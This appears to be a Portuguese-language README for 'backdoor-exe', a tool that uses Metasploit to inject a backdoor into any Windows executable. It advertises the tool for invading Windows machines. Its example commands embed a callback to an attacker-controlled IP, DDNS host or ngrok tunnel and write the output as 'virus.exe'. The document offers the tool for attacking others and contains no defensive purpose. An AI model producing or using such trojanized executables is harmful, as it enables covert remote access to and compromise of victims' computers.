# backdoor-exe
Invada qualquer Windows usando um EXE modificado!

Necessário o Perl, MSF(console e venom), um EXE(qualquer) e porta aberta, é claro..

Para adcionar o Backdoor ao EXE use por exemplo:

root@ZBox:~/Desktop# ./backdoor-exe

Usage: backdoor-exe <exe> <ip/ddns> <port> <out>
  
Usage: backdoor-exe -n <exe> <ngrok_host> <ngrok_port> <fwdport> <out>

IP:

./backdoor-exe test.exe 192.168.1.143 9090 virus.exe

Host/DDNS:

./backdoor-exe test.exe fuckthisn0ip.ddns.net 9090 virus.exe

Ngrok:

./backdoor-exe -n test.exe xxxx.ngok.io xxxx 9090 virus.exe

Meu canal no YT: https://www.youtube.com/channel/UC_0YeOjcY-d_Tq0Kvcf4CKg
